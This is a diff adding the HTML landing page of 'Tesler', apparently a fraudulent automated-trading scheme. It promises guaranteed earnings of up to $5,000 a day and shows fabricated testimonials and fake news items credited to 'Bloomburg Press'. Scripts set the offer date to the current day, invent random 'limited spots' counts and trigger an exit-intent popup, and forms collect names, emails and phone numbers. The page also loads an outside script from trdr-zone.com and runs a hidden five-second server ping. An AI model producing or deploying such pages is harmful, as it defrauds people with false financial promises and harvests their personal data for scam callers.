@@ -1,0 +1,787 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Tesler">
+    <meta name="keywords" content="Tesler">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Tesler</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        // Function to hide the popup
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
+        }
+    </script>
+
+    <script src="https://trdr-zone.com/scripts/script-loader-lp.js"></script>
+    <!-- Favicons -->
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/lp/968882af3e/img/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <!-- Open Graph -->
+    <meta property="og:title" content="Tesler">
+    <meta property="og:description" content="Tesler">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="test">
+    <link rel="stylesheet" href="css/2_style.css">
+    <link rel="stylesheet" href="css/2_min.css">
+    <style>
+        /* .SnapLinksContainer :not([xyz]) {} */
+        .iti{
+            display: block!important;
+        }
+
+        .SnapLinksContainer .SnapLinksHighlighter {
+            all: initial;
+            overflow: visible;
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            width: 10px;
+            height: 10px;
+        }
+
+        .SnapLinksContainer {
+            pointer-events: none;
+            z-index: 999999;
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            margin: 0px;
+            padding: 0px;
+            height: 0px;
+            width: 0px;
+        }
+
+        .SnapLinksContainer>.SL_SelectionRect {
+            outline: 2px dashed rgba(0, 200, 0, 1);
+            position: absolute;
+            overflow: visible;
+            z-index: 1;
+        }
+
+        .SL_SelectionRect>.SL_SelectionLabel {
+            position: absolute;
+            background: #FFFFD9;
+            border: 1px solid black;
+            border-radius: 2px;
+            padding: 2px;
+            font: normal 12px Verdana;
+            white-space: nowrap;
+            color: #000000;
+        }
+        #phone{
+          width:100%!important;
+            padding: 0 !important;
+        }
+        .intro__video{
+					position: relative;
+					/*padding-bottom: 56.25%;*/
+				}
+				.intro__video iframe {
+					position: absolute;top: 0;left: 0;width: 100%;height: 100%;
+				}
+    </style>
+    <link rel="stylesheet" type="text/css" href="css/intlphone.css"></head>
+<body>
+<div style="width: 100%; height:100%; text-align: center; z-index: 100000;">
+    <p style="color: black;">
+        Attention! after registration, the manager will contact you during the day
+    </p>
+</div>
+    <header class="header">
+        <div class="myContainer">
+            <img src="images/logo.png" alt="">
+        </div>
+    </header>
+    <section class="fScreen">
+        <div class="myContainer">
+            <div class="myRow">
+                <h1 class="main__title">Make Up to <span class="bold">$324</span> per hour Starting now, <span class="bold" id="dataCur">October 17</span><br>
+                    Just
+                    by Using This Platform for <span class="bold">5</span>
+                    Minutes </h1>
+            </div>
+            <div class="myRow myRow_two" s="">
+                <div class="videoWrap">
+
+                    <!-- <div style="position:relative;">
+                        <video width="100%" controls autoplay source src="video/video.mp4"></video>
+                    </div> -->
+
+<div class="intro__video">
+    <video controls muted autoplay>
+        <source src="videos/Tesler.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+            </div>
+
+                </div>
+                <div class="registrWrap" id="registration">
+                    <div class="register-title">
+                        Register
+                    </div>
+                    <div class="registWrap__form" id="form1">
+                        <div class="blur__content">
+                            <h2 class="form-fake__title">See the results in only 5 minutes <br>Test it now for a free
+                                trial
+                            </h2>
+                            <form action="" method="POST" id="form" class="form form-container js-form-first">
+                               <div class="form_group--name">
+                                    <input class="form__input_fake" type="text" name="first_name" placeholder="First Name" required="" id="first_name">
+                                </div>
+                                <div class="form_group--name">
+                                    <input class="form__input_fake" type="text" name="last_name" placeholder="Last Name" required="" id="last_name">
+                                </div>
+                                <div class="form_group--email">
+                                    <input class="form__input_fake" type="email" name="email" placeholder="Email" required="" id="mail">
+                                </div>
+                                <div class="form_group--phone">
+                                    <input class="phone form__input_fake" maxlength="18" name="phone" data-name="phone" placeholder="Phone" minlength="8" type="text" id="phone" required="">
+                                    <div id="number-error-msg-2" class="code-embed w-embed">
+                                        <span id="error-msg-2" style="color: white;" class="hide"></span>
+                                    </div>
+                                    <input class="country w-input" maxlength="256" name="country" data-name="country" type="hidden" value="" id="country">
+                                </div>
+                                <p class="spot-text"></p>
+                                <label style="color: black !important;">
+                                    <input style="margin-right: 10px" type="checkbox" required>
+                                    By registration, I agree and accept the Website terms of use and Privacy Policy.
+                                </label>
+
+                                <button class="form__button_fake" name="sub" type="submit">Register now</button>
+                            </form>
+                        
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <div class="content-bg">
+        <section class="navigate">
+            <div class="myContainer">
+                <div class="myRow">
+                    <p class="navigate__descr">Tesler uses the latest revolutionary Lead Pattern data. Tesler App make
+                        everything
+                        you to start new life by
+                        earning for you in auto pilot. Our system <span class="bold">24/7</span> monitors financial
+                        markets
+                        and founds the best solutions
+                        for
+                        you. This allows people to receive an automated cut of the 8.1 trillion dollars that are traded
+                        every
+                        day!</p>
+                </div>
+            </div>
+        </section>
+        <section class="members">
+            <div class="myContainer">
+                <div class="gallery">
+                    <h2 class="members__title">Our Members</h2>
+                    <div class="myColumn">
+                        <div class="members__box members__box_big">
+                            <div class="flug">
+                                <img src="images/rus_icon.png" alt="RUS">
+                            </div>
+                            <div class="gallery__ava gallery__ava_big members__portret rus1">
+                                <div class="gallery__feedback">«Thanks to TESLER program I made over $14,000 in my first
+                                    4
+                                    days!
+                                    At first
+                                    I
+                                    thought it was going to be complicated but it’s been really straight forward. I just
+                                    registered, opened
+                                    my personal account and let TESLER do the hard work. I got more than I expected.»
+                                </div>
+                            </div>
+                        </div>
+                        <div class="members__box ">
+                            <div class="flug">
+                                <img src="images/frunch_icon.png" alt="franch">
+                            </div>
+                            <div class="gallery__ava gallery__ava_small members__portret franch1">
+                                <div class="gallery__feedback">“I never expected to make such a profit. I was wrong!
+                                    I’ve
+                                    earned
+                                    nearly
+                                    25
+                                    thousand dollars in just 2 weeks. At this rate I’ll reach $82,478.22 within my first
+                                    month.
+                                    Incredibly
+                                    pleased.”
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="myColumn">
+                        <div class="members__box">
+                            <div class="flug">
+                                <img src="images/brit_icon.png" alt="brit">
+                            </div>
+                            <div class="gallery__ava gallery__ava_small members__portret brit2">
+                                <div class="gallery__feedback">"Dear Tesler Team, thank you so much! $10,008 in just
+                                    48
+                                    hours is a
+                                    huge
+                                    profit for me... Huge!! Thank You Steven!"
+                                </div>
+                            </div>
+                        </div>
+                        <div class="members__box">
+                            <div class="flug">
+                                <img src="images/ital_icon.png" alt="Italy">
+                            </div>
+                            <div class="gallery__ava gallery__ava_small members__portret italy1">
+                                <div class="gallery__feedback">"Tesler earned me more than $8,000 in the first 6
+                                    days!
+                                    Now
+                                    it's so
+                                    difficult to find a job but now I don’t need it... Your Tesler software improved my
+                                    life
+                                    and
+                                    the life
+                                    of my family. Thank you for this chance…
+                                </div>
+                            </div>
+                        </div>
+                        <div class="members__box">
+                            <div class="flug">
+                                <img src="images/frunch_icon.png" alt="frunch">
+                            </div>
+                            <div class="gallery__ava gallery__ava_small members__portret frunch2">
+                                <div class="gallery__feedback">"OMG! My wife thought I was joking when I showed her how
+                                    much I
+                                    made! Within the first hour I made $302.33!!! That’s all I needed to continue"...
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="myColumn">
+                        <div class="members__box members__box_big">
+                            <div class="flug">
+                                <img src="images/irl_icon.png" alt="Irland">
+                            </div>
+                            <div class="gallery__ava gallery__ava_big members__portret irland1">
+                                <div class="gallery__feedback">"I always only find scams… There are many of them…
+                                    fortunately
+                                    for you
+                                    and your family I couldn’t find any reason not to recommend Teslers high achieving
+                                    software. You
+                                    are the first platform I can really trust and recommend!"
+                                </div>
+                            </div>
+                        </div>
+                        <div class="members__box">
+                            <div class="flug">
+                                <img src="images/germ_icon.png" alt="germ">
+                            </div>
+                            <div class="gallery__ava gallery__ava_small members__portret germ1">
+                                <div class="gallery__feedback">“I was shocked by the profits I made with TESLER. It’s so
+                                    simple
+                                    to use
+                                    and the results are OUTSTANDING! I recommend it for sure,
+                                    especially
+                                    if you
+                                    don’t know much about the markets because its 'click-click' simple.” Thank you so
+                                    much
+                                    Steven and the
+                                    Tesler Team!
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <section class="offers">
+        <div class="myContainer">
+            <div class="myRow offers__column ">
+                <div class="offers__left">
+                    <img class="offers__left_img" src="images/phone.gif" alt="phone">
+                </div>
+                <div class="offers__right">
+                    <h2 class="offers__title">Tesler Offers</h2>
+                    <div class="border"></div>
+                    <ul class="offers__list">
+                        <li class="offers__item">Suits for both Beginners and Professionals.</li>
+                        <li class="offers__item">Game changing "Lead Pattern" Algorithm</li>
+                        <li class="offers__item">Makes up to $5,000 a day for everyone guaranteed</li>
+                        <li class="offers__item">Works on any device, installs in just 2 minutes.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="why">
+        <div class="myContainer">
+            <div class="myRow">
+                <div class="why-me">
+                    <h2 class="why-me__title">why tesler</h2>
+                    <p class="why_me__descr">Our system constantly monitors the global financial markets, <span class="bold">24/7</span> Massive Data
+                        Crunching Mainframes to
+                        identify models in global markets. This allows everyone who wants to receive an automated slice
+                        of
+                        the <span class="bold">7.8</span>
+                        trillion dollars that are traded every single day!</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="news">
+        <div class="myRow">
+            <div class="myClumn_5">
+                <div class="myRow__200">
+                    <div class="news__bg_small"></div>
+                    <div class="news-div news-div_content">
+                        <div class="date-time silver-news">01/14/2025 09:28 am</div>
+                        <h1 class="news-titles">Drugmakers Jump</h1>
+                        <div class="news-border border"></div>
+                        <div class="silver-news">Pharmaceutical stocks and bonds were among the day’s biggest winners
+                            today,
+                            Tesler
+                            pounces...
+                        </div>
+                    </div>
+                </div>
+                <div class="myRow__200">
+                    <div class="news-div bg__long">
+                        <div class="date-time white">01/13/2025 09:28 am</div>
+                        <h1 class="news-titles">Unexpected Election Outcome</h1>
+                        <div class="news-border border"></div>
+
+                        <div>Here’s one way to sum up how Tesler made a killing for its members following the U.S.
+                            presidential election: Investors didn’t do what they were expected to do after American
+                            voters
+                            didn’t do what they were expected to do. Tesler Members made huge windfall profits!!!
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="myClumn_7">
+                <div class="myRow__400">
+                    <div class="news__bg_big"></div>
+                    <div class="news-div_big">
+                        <div class="date-time silver-news">01/13/2025 07:58 am</div>
+                        <h1 class="news-titles">How to Play the Nasdaq</h1>
+                        <div class="news-border border"></div>
+                        <div class="silver-news">Tesler analyzes Nasdaq "Lead Patterns" after Kevin Kelly discusses the
+                            recent performance
+                            of stocks and his options strategy for the Nasdaq 100 Index. Tesler Members make big bank
+                            (Source: Bloomburg Press)
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+		<div class="popup" id="popup">
+			<div class="popup__container">
+				<div class="popup__content">
+					<div class="popup__title">
+                        <button class="close-btn" onclick="closePopup()">X</button>
+						<p>
+                        You don't have the opportunity to go back in time and make a profitable investment. <span>But you can invest on time, Today.</span>
+						</p>
+					</div>
+					<div class="popup__form">
+						<form action="" method="post" class="form form-popup">
+							<input required="" name="first_name" type="text" class="form__input form__name" placeholder="First Name" onkeyup="this.value = this.value.replace(/[^А-Яа-яA-z]/g,'');" id="first_name-2">
+                            <input required="" name="last_name" type="text" class="form__input form__name" placeholder="Last Name" onkeyup="this.value = this.value.replace(/[^А-Яа-яA-z]/g,'');"id="last_name-2">
+							<input required="" name="email" type="email" class="form__input form__email" placeholder="Email" id="mail-2">
+                            <input class="phone form__input form__name" maxlength="18" name="phone" data-name="phone" placeholder="Phone" minlength="8" type="text" id="phone-2" required="">
+                            <div id="number-error-msg" class="code-embed w-embed">
+                                <span id="error-msg" style="color: white;" class="hide"></span>
+                            </div>
+                            <input class="country w-input" maxlength="256" name="country" data-name="country" type="hidden" value="" id="country-2">
+                            <p class="spot-text"></p>
+                            <label style="margin-bottom: 2rem;">
+                                <input type="checkbox" required>
+                                By registration, I agree and accept the Website terms of use and Privacy Policy.
+                            </label>
+
+                            <button class="form__button button" id="sub2">Submit your application</button>
+						</form>
+					</div>
+				</div>
+			</div>
+		</div>
+    <footer class="footer-tesler">
+        <div class="myContainer">
+            <div class="myRow">
+                <div class="navigation">
+                    <div class="navigation__item"><a class="navigation__link navigation__link_before" href="#registration">Home</a>
+                    </div>
+                    <div class="navigation__item"><a class="navigation__link" href="#" style="cursor:pointer" data-terms="use">Website
+                            Agreement</a></div>
+                    <div class="navigation__item"><a class="navigation__link" style="cursor:pointer" href="#" data-terms="policy">Privacy
+                            Policy</a></div>
+                    <div class="navigation__item"><a class="navigation__link" href="#">Contact Us</a></div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+
+    <script>
+        let newData = new Date();
+        let months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+        document.getElementById("dataCur").innerHTML = months[newData.getMonth()] + ' ' + newData.getDate();
+    </script>
+
+
+
+    <div class="SnapLinksContainer" style="margin-left: 0px; margin-top: 0px; display: none;">
+        <div class="SL_SelectionRect">
+            <div class="SL_SelectionLabel"></div>
+        </div>
+        <svg class="SnapLinksHighlighter" xmlns="http://www.w3.org/2000/svg">
+            <rect width="0" height="0"></rect> <!-- Used for easily cloning the properly namespaced rect -->
+        </svg>
+    </div>
+
+    <div id="cookie" class=" text-center cookiealert" role="alert">
+        <b>Do you like cookies?</b> We use cookies to ensure you get the best experience on our website.
+
+        <button id="width-block" type="button" class="btn btn-primary btn-sm acceptcookies">
+            I agree
+        </button>
+    </div>
+
+    <style>
+        .cookiealert {
+            position: fixed;
+            display: block;
+            z-index: 999999;
+            justify-content: center;
+
+            background-color: #000000;
+            width: 100%;
+            bottom: 0;
+            padding: 10px;
+            font-size: 25px;
+        }
+
+        @media screen and (max-width: 600px) {
+            .cookiealert {
+                font-size: 12px;
+            }
+        }
+    </style>
+
+		<script>
+			function getScrollbarWidth() {
+			const outer = document.createElement('div')
+			outer.style.cssText = 'visibility:hidden;overflow:scroll;msOverflowStyle:scrollbar'
+			document.body.appendChild(outer)
+			const scrollbarWidth = outer.offsetWidth - outer.clientWidth
+			document.body.removeChild(outer)
+			return scrollbarWidth
+		}
+
+		let popupTimeout;
+		let isPopupVisible = false;
+		const popup = document.querySelector('#popup')
+
+		function showPopup() {
+			if (!isPopupVisible) {
+					popup.classList.add('--show');
+					document.body.style.cssText = `padding-right:${getScrollbarWidth()}px;overflow:hidden;`;
+					isPopupVisible = true;
+			}
+		}
+
+		function hidePopup() {
+			if (isPopupVisible) {
+					popup.classList.remove('--show');
+					document.body.style.cssText = '';
+					isPopupVisible = false;
+			}
+		}
+
+		function handleMouseLeave() {
+			if (!isPopupVisible) {
+				showPopup();
+			}
+		}
+
+		function handleScroll() {
+			if (window.innerWidth <= 768 && !isPopupVisible) {
+					if (window.scrollY > (document.body.scrollHeight - window.innerHeight) / 2) {
+						showPopup()
+						window.removeEventListener('scroll', handleScroll); 
+						clearTimeout(popupTimeout);
+					}
+			}
+		}
+
+		window.addEventListener('scroll', handleScroll);
+
+		popupTimeout = setTimeout(() => {
+			showPopup();
+		}, 30000);
+
+		document.addEventListener('mouseleave', ()=>{
+			handleMouseLeave()
+			clearTimeout(popupTimeout);
+		});
+
+		document.addEventListener('mousedown', (e) => {
+			const popupRoot = document.querySelector('.popup__content')
+			if (popup.classList.contains('--show') && !popupRoot.contains(e.target) ) {
+				hidePopup()
+			}
+		})
+		</script>
+
+    <script src="js/jquery.min.js"></script>
+    <!-- <script src='assets/js/loadingoverlay.js'></script> -->
+    <!-- <script src="assets/js/intlTelInput.js"></script>
+    <script src='assets/js/just-validate.js'></script>
+    <script src='assets/js/send.js'></script> -->
+    <script src="js/all.js"></script>
+    <script>
+        const widthBlock = document.getElementById("width-block");
+        widthBlock.addEventListener("click", () => {
+            document.getElementById("cookie").style.display = "none";
+            localStorage.setItem("first-visit", "true");
+        })
+        document.addEventListener("DOMContentLoaded", function () {
+            if (localStorage.getItem("first-visit") === "true") {
+                document.getElementById("cookie").style.display = "none";
+            }
+            else {
+                document.getElementById("cookie").style.display = "flex";
+            }
+        });
+
+    </script>
+
+
+    <!-- <script>
+
+        if (params['first_name'] && params['email']) {
+            form.style.display = "none"
+            form2.style.display = "block"
+        } else {
+            form.style.display = "block"
+            form2.style.display = "none"
+        }
+
+
+    </script> -->
+
+	<!-- alert -->
+<!-- <script>
+    document.body.insertAdjacentHTML("afterbegin", `<div class="alert">
+        <h1 class="alert__title">Limited <span>access</span></h1>
+			<div class="alert__number">
+					<h3>Free places left:</h3>
+           <span id="numbers">15<span>
+        </div>
+      </div>`);
+
+            let interval = setInterval(function () {
+                let cp2 = parseInt(document.querySelector('#numbers').textContent);
+                if (cp2 > 1) {
+                    document.querySelector('#numbers').textContent = cp2 - 1;
+                } else {
+                    clearInterval(interval);
+                }
+            }, 40000);
+    </script>
+
+    <style>
+       .alert{
+        position: fixed;
+        bottom: 42px;
+        right: 34px;
+        z-index: 100;
+
+        max-width: 230px;
+        width: 100%;
+        padding: 0;
+        border-radius: 8px;
+        border: 2px solid black;
+        margin: 0;
+
+        background: rgba(0,0,0,0.6);
+        backdrop-filter:blur(4px);
+       }
+
+       .alert__title{
+        margin: 0;
+        padding: 19px 21.5px 12px;
+
+
+        font-family: Arial;
+        font-weight: 700;
+        line-height: 142.52%;
+        font-size: 1.125rem;
+        text-align: center;
+        text-transform: uppercase;
+        color:white;
+       }
+
+       .alert__title span{
+        color:#F70000;
+       }
+
+       .alert__number{
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+
+        padding: 16px 21.5px 10px;
+        background-color: #000000;
+        border-radius: 0 0 8px 8px;
+       }
+
+       .alert__number h3{
+        margin: 0;
+        padding: 0;
+
+        font-family: Arial;
+        font-weight: 700;
+        font-size: 14px;
+        line-height: 142.52%;
+        letter-spacing: 0.02em;
+        text-align: center;
+        text-transform: uppercase;
+       }
+
+       .alert__number span{
+        font-family: Arial;
+        font-weight: 700;
+        font-size: 45px;
+        line-height: 142.52%;
+        color:white;
+       }
+
+       @media(max-width:600px)
+       {
+        .alert{
+            max-width: 200px;
+
+            right: 15px;
+            bottom: 28px;
+        }
+
+        .alert__title{
+            font-size: 0.875rem;
+        }
+
+        .alert__number h3{
+            font-size: 0.625rem
+        }
+
+        .alert__number span{
+            font-size: 1.875rem;
+        }
+       }
+
+       @media(max-width:400px){
+        .alert{
+            max-width: 150px;
+        }
+
+        .alert__title{
+            font-size: 0.75rem;
+            padding: 11px 2px 8px;
+        }
+
+        .alert__number{
+            padding: 9px 2px 6px;
+        }
+
+        .alert__number h3{
+            font-size: 0.625rem;
+        }
+
+        .alert__number span{
+            font-size: 1.375rem;
+        }
+       }
+    </style> -->
+    <script type="text/javascript"> function noregret(){var xx = new XMLHttpRequest();xx.open("GET","?good=22128382&z="+Math.random(),true);xx.send(null);setTimeout("noregret()",5000);}function trytosee(){isd&&(setTimeout("noregret()",5000),isd=!1)}var isd=!0;window.onload=function(){document.hidden||document.msHidden||document.webkitHidden||document.mozHidden?window.onfocus=function(){trytosee(),window.onfocus=null}:trytosee()}; </script><script type="text/javascript" src="js/intlphone.js"></script>
+
+<style>
+    .iti__selected-dial-code{
+        color: black;
+    }
+    .iti__flag-container{
+        height: 100%;
+    }
+</style>
+<style>
+    .spot-text {
+        font-size: 1.2rem;
+        font-weight: 600;
+        color: #e74c3c;
+        margin-top: 20px;
+    }
+</style><script>
+    function getRandomSpots() {
+        // Generate a random number between 1 and 10
+        return Math.floor(Math.random() * 10) + 2;
+    }
+    const spots = getRandomSpots();
+    const spotElements = document.getElementsByClassName('spot-text'); // Get all elements with class 'spot-text'
+
+    // Loop through each element with the class 'spot-text' and update the innerHTML
+    for (let i = 0; i < spotElements.length; i++) {
+        spotElements[i].innerHTML = `The number of spots is limited: ${spots} spots available.`;
+    }
+</script>
+<style>
+    /* Style the checkbox container */
+    label {
+        display: flex;
+        align-items: center;
+        font-size: 14px;
+        color: white;
+        line-height: 1.5;
+        height: 18px; /* Ensure label height matches checkbox height */
+        margin-top: 18px;
+    }
+
+    /* Style the checkbox itself */
+    input[type="checkbox"] {
+        margin-right: 10px;
+        width: 18px;
+        height: 18px;
+        accent-color: #007bff; /* Modern browsers support accent-color */
+        cursor: pointer;
+        vertical-align: middle; /* Ensures alignment with the label text */
+    }
+
+    /* Add a hover effect for the checkbox */
+    input[type="checkbox"]:hover {
+        transform: scale(1.1);
+        transition: transform 0.2s ease;
+    }
+
+    /* Style for links inside the label */
+    label a {
+        color: #007bff;
+        text-decoration: none;
+    }
+
+    label a:hover {
+        text-decoration: underline;
+    }
+
+    /* Ensure responsiveness */
+    @media (max-width: 600px) {
+        label {
+            font-size: 13px;
+        }
+    }
+
+</style>
+
+</body></html>
